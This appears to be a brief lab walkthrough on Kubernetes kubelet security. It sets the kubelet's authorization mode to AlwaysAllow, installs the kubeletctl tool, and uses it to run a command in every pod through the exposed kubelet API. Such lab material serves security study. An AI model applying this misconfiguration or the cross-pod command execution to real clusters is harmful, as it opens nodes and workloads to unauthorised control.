
#### Step 1 Make a request to Kubelet API:
```sh
apt install net-tools
netstat -ntlp
curl -k -X GET https://localhost:10250/pods
```
#### Step 2 Modify the Kubelet Configuration file:
```sh
cd /var/lib/kubelet
cp config.yaml config.yaml.bak
```

```sh
Set anonymous auth to false
Authorization Mode to AlwaysAllow
```

```sh
systemctl restart kubelet
systemctl status kubelet
```

#### Step 3 Make Request to Kubelet API:
```sh
curl -k -X GET https://localhost:10250/pods
```
#### Step 4 Download kubeletctl:

##### GitHub Repo

https://github.com/cyberark/kubeletctl

```sh
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.6/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

```sh
kubeletctl pods -i
kubeletctl run "whoami" --all-pods -i
```

#### Step 5 Verify the certificate of the kubelet for node authorizer group:
```sh
openssl x509 -in  /var/lib/kubelet/pki/kubelet-client-current.pem -text -noout
```
